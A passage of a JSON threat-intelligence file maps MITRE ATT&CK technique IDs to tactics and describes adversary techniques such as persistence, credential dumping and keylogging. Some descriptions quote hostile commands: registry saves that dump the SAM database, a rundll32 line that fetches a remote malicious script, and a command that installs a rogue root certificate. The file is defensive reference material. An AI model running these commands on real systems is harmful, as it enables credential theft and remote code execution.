\"attack-pattern--322bad5a-1c49-4d23-ab79-76d641794afa\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1\", \"attribution_scope\": \"confirmed\"}], \"Collection\": [{\"id\": \"attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--1e9eb839-294b-48cc-b0d3-c45555a2a004\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--d28ef391-8ed4-45dc-bc4a-2f43abf54416\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--53ac20cd-aca3-406e-9aa0-9fc7fdc60a5a\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--30973a08-aed9-4edf-8604-9084ce1b5c4f\", \"attribution_scope\": \"confirmed\"}], \"Initial Access\": [{\"id\": \"attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c\", \"attribution_scope\": \"confirmed\"}], \"Command and Control\": [{\"id\": \"attack-pattern--b8902400-e6c5-4ba2-95aa-2d35b442b118\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--bf176076-b789-408e-8cba-7275e81c0ada\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--b18eae87-b469-4e14-b454-b171b416bc18\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--4fe28b27-b13c-453e-a386-c2ef362a573b\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--f6dacc85-b37d-458e-b58d-74fc4bbf5755\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add\", \"attribution_scope\": \"confirmed\"}]}, \"is_publishable\": true}], \"attack-patterns\": {\"attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-01-10T16:03:18.865Z\", \"name\": \"Create or Modify System Process\", \"attack_pattern_identifier\": \"T1543\", \"description\": \"Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services. (Citation: TechNet Services) On macOS, launchd processes known as [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run to finish system initialization and load user specific parameters.(Citation: AppleDocs Launch Agent Daemons) \\n\\nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  \\n\\nServices, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges. (Citation: OSX Malware Detection).  \", \"modified\": \"2020-10-09T13:46:29.922Z\", \"id\": \"attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5\"}, \"attack-pattern--f1951e8a-500e-4a26-8803-76d95c4554b4\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-10T18:33:36.159Z\", \"name\": \"Service Execution\", \"attack_pattern_identifier\": \"T1569.002\", \"modified\": \"2020-03-28T18:52:02.384Z\", \"description\": \"Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](https://attack.mitre.org/software/S0039).\\n\\n[PsExec](https://attack.mitre.org/software/S0029) can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.(Citation: Russinovich Sysinternals)\\n\\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003) during service persistence or privilege escalation.\", \"id\": \"attack-pattern--f1951e8a-500e-4a26-8803-76d95c4554b4\"}, \"attack-pattern--2aed01ad-3df3-4410-a8cb-11ea4ded587c\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-21T21:15:06.561Z\", \"name\": \"Domain Groups\", \"attack_pattern_identifier\": \"T1069.002\", \"description\": \"Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\\n\\nCommands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.\", \"modified\": \"2020-03-12T19:07:53.043Z\", \"id\": \"attack-pattern--2aed01ad-3df3-4410-a8cb-11ea4ded587c\"}, \"attack-pattern--5372c5fe-f424-4def-bcd5-d3a8e770f07b\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-21T21:00:48.814Z\", \"name\": \"Disable or Modify System Firewall\", \"attack_pattern_identifier\": \"T1562.004\", \"description\": \"Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\\n\\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. \", \"modified\": \"2020-03-29T22:18:11.166Z\", \"id\": \"attack-pattern--5372c5fe-f424-4def-bcd5-d3a8e770f07b\"}, \"attack-pattern--d28ef391-8ed4-45dc-bc4a-2f43abf54416\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2018-04-18T17:59:24.739Z\", \"name\": \"Data from Information Repositories\", \"attack_pattern_identifier\": \"T1213\", \"description\": \"Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information.\\n\\nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:\\n\\n* Policies, procedures, and standards\\n* Physical / logical network diagrams\\n* System architecture diagrams\\n* Technical system documentation\\n* Testing / development credentials\\n* Work / project schedules\\n* Source code snippets\\n* Links to network shares and other internal resources\\n\\nInformation stored in a repository may vary based on the specific instance or environment. Specific common information repositories include [Sharepoint](https://attack.mitre.org/techniques/T1213/002), [Confluence](https://attack.mitre.org/techniques/T1213/001), and enterprise databases such as SQL Server.\", \"modified\": \"2020-10-12T12:16:55.085Z\", \"id\": \"attack-pattern--d28ef391-8ed4-45dc-bc4a-2f43abf54416\"}, \"attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-09T14:12:31.196Z\", \"name\": \"Windows Command Shell\", \"attack_pattern_identifier\": \"T1059.003\", \"modified\": \"2020-03-28T17:02:13.722Z\", \"description\": \"Adversaries may abuse the Windows command shell for execution. The Windows command shell (<code>cmd.exe</code>) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. \\n\\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\\n\\nAdversaries may leverage <code>cmd.exe</code> to execute various commands and payloads. Common uses include <code>cmd.exe /c</code> to execute a single command, or abusing <code>cmd.exe</code> interactively with input and output forwarded over a command and control channel.\", \"id\": \"attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62\"}, \"attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:35.733Z\", \"name\": \"System Owner/User Discovery\", \"attack_pattern_identifier\": \"T1033\", \"modified\": \"2020-03-15T01:03:47.866Z\", \"description\": \"Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\\n\\nUtilities and commands that acquire this information include <code>whoami</code>. In Mac and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>.\", \"id\": \"attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104\"}, \"attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:25.454Z\", \"name\": \"Email Collection\", \"attack_pattern_identifier\": \"T1114\", \"description\": \"Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients. \", \"modified\": \"2020-03-24T18:31:06.417Z\", \"id\": \"attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f\"}, \"attack-pattern--c615231b-f253-4f58-9d47-d5b4cbdb6839\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-21T21:05:32.844Z\", \"name\": \"Install Root Certificate\", \"attack_pattern_identifier\": \"T1553.004\", \"description\": \"Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\\n\\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)\\n\\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)\\n\\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)\\n\\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)\", \"modified\": \"2020-03-19T20:31:11.389Z\", \"id\": \"attack-pattern--c615231b-f253-4f58-9d47-d5b4cbdb6839\"}, \"attack-pattern--f6dacc85-b37d-458e-b58d-74fc4bbf5755\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-14T23:08:20.244Z\", \"name\": \"Internal Proxy\", \"attack_pattern_identifier\": \"T1090.001\", \"modified\": \"2020-03-15T00:46:26.598Z\", \"description\": \"Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.\\n\\nBy using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.\", \"id\": \"attack-pattern--f6dacc85-b37d-458e-b58d-74fc4bbf5755\"}, \"attack-pattern--eb062747-2193-45de-8fa2-e62549c37ddf\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-11T18:23:26.059Z\", \"name\": \"Remote Desktop Protocol\", \"attack_pattern_identifier\": \"T1021.001\", \"modified\": \"2020-02-25T19:23:34.204Z\", \"description\": \"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\\n\\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services) \\n\\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1546/008) technique for Persistence.(Citation: Alperovitch Malware)\", \"id\": \"attack-pattern--eb062747-2193-45de-8fa2-e62549c37ddf\"}, \"attack-pattern--deb98323-e13f-4b0c-8d94-175379069062\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-05T14:17:46.686Z\", \"name\": \"Software Packing\", \"attack_pattern_identifier\": \"T1027.002\", \"description\": \"Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018) \\n\\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, (Citation: Wikipedia Exe Compression) but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.  \", \"modified\": \"2020-02-05T20:05:41.548Z\", \"id\": \"attack-pattern--deb98323-e13f-4b0c-8d94-175379069062\"}, \"attack-pattern--15dbf668-795c-41e6-8219-f0447c0e64ce\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:55.471Z\", \"name\": \"Permission Groups Discovery\", \"attack_pattern_identifier\": \"T1069\", \"description\": \"Adversaries may attempt to find group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.\", \"modified\": \"2020-10-08T17:36:01.675Z\", \"id\": \"attack-pattern--15dbf668-795c-41e6-8219-f0447c0e64ce\"}, \"attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-15T16:13:46.151Z\", \"name\": \"Web Protocols\", \"attack_pattern_identifier\": \"T1071.001\", \"description\": \"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \\n\\nProtocols such as HTTP and HTTPS that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. \", \"modified\": \"2020-03-26T20:15:35.821Z\", \"id\": \"attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161\"}, \"attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:44.421Z\", \"name\": \"External Remote Services\", \"attack_pattern_identifier\": \"T1133\", \"description\": \"Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) can also be used externally.\\n\\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\", \"modified\": \"2020-06-19T20:07:09.600Z\", \"id\": \"attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d\"}, \"attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-11T18:58:11.791Z\", \"name\": \"Keylogging\", \"attack_pattern_identifier\": \"T1056.001\", \"description\": \"Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured.\\n\\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:\\n\\n* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.\\n* Reading raw keystroke data from the hardware buffer.\\n* Windows Registry modifications.\\n* Custom drivers.\\n* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) \", \"modified\": \"2020-10-21T01:30:56.227Z\", \"id\": \"attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4\"}, \"attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:19.735Z\", \"name\": \"OS Credential Dumping\", \"attack_pattern_identifier\": \"T1003\", \"description\": \"Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information.\\n\\nSeveral of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.\\n\", \"modified\": \"2020-06-09T20:46:00.758Z\", \"id\": \"attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22\"}, \"attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:32.662Z\", \"name\": \"Obfuscated Files or Information\", \"attack_pattern_identifier\": \"T1027\", \"description\": \"Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \\n\\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as JavaScript. \\n\\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\\n\\nAdversaries may also obfuscate commands executed from payloads or directly via a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017) \", \"modified\": \"2020-09-16T19:24:20.601Z\", \"id\": \"attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a\"}, \"attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:48.728Z\", \"name\": \"Process Discovery\", \"attack_pattern_identifier\": \"T1057\", \"modified\": \"2020-03-26T18:05:53.130Z\", \"description\": \"Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\\n\\nIn Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via /proc.\", \"id\": \"attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580\"}, \"attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2018-04-18T17:59:24.739Z\", \"name\": \"Exploit Public-Facing Application\", \"attack_pattern_identifier\": \"T1190\", \"description\": \"Adversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL)(Citation: NVD CVE-2016-6662), standard services (like SMB(Citation: CIS Multiple SMB Vulnerabilities) or SSH), network device administration and management protocols (like SNMP and Smart Install(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)), and any other applications with Internet accessible open sockets, such as web servers and related services.(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may include [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211). \\n\\nIf an application is hosted on cloud-based infrastructure, then exploiting it may lead to compromise of the underlying instance. This can allow an adversary a path to access the cloud APIs or to take advantage of weak identity and access management policies.\\n\\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)\", \"modified\": \"2020-10-21T01:10:54.358Z\", \"id\": \"attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c\"}, \"attack-pattern--1644e709-12d2-41e5-a60f-3470991f5011\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-11T18:42:07.281Z\", \"name\": \"Security Account Manager\", \"attack_pattern_identifier\": \"T1003.002\", \"description\": \"Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.\\n\\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\\n\\n* pwdumpx.exe\\n* [gsecdump](https://attack.mitre.org/software/S0008)\\n* [Mimikatz](https://attack.mitre.org/software/S0002)\\n* secretsdump.py\\n\\nAlternatively, the SAM can be extracted from the Registry with Reg:\\n\\n* <code>reg save HKLM\\\\sam sam</code>\\n* <code>reg save HKLM\\\\system system</code>\\n\\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation: GitHub Creddump7)\\n\\nNotes: \\n* RID 500 account is the local, built-in administrator.\\n* RID 501 is the guest account.\\n* User accounts start with a RID of 1,000+.\\n\", \"modified\": \"2020-03-25T15:17:30.640Z\", \"id\": \"attack-pattern--1644e709-12d2-41e5-a60f-3470991f5011\"}, \"attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-01-23T17:46:59.535Z\", \"name\": \"Boot or Logon Autostart Execution\", \"attack_pattern_identifier\": \"T1547\", \"description\": \"Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming)\\u00a0 These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\\n\\nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.\", \"modified\": \"2020-10-09T16:05:36.772Z\", \"id\": \"attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf\"}, \"attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:49.546Z\", \"name\": \"Command and Scripting Interpreter\", \"attack_pattern_identifier\": \"T1059\", \"description\": \"Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\\n\\nThere are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript/JScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).\\n\\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells.\", \"modified\": \"2020-10-22T16:43:39.362Z\", \"id\": \"attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830\"}, \"attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:46.977Z\", \"name\": \"Scheduled Task/Job\", \"attack_pattern_identifier\": \"T1053\", \"modified\": \"2020-10-14T15:20:01.069Z\", \"description\": \"Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security)\\n\\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges).\", \"id\": \"attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9\"}, \"attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-23T18:03:46.248Z\", \"name\": \"Rundll32\", \"attack_pattern_identifier\": \"T1218.011\", \"description\": \"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads.\\n\\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\\n\\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\\\"\\\\..\\\\mshtml,RunHTMLApplication \\\";document.write();GetObject(\\\"script:https[:]//www[.]example[.]com/malicious.sct\\\")\\\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\", \"modified\": \"2020-06-20T22:31:42.113Z\", \"id\": \"attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5\"}, \"attack-pattern--f4c1826f-a322-41cd-9557-562100848c84\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-02-11T19:01:56.887Z\", \"name\": \"Modify Authentication Process\", \"attack_pattern_identifier\": \"T1556\", \"description\": \"Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows or pluggable authentication modules (PAM) on Unix-based systems, responsible for gathering, storing, and validating credentials. \\n\\nAdversaries may maliciously modify a part of this process to either 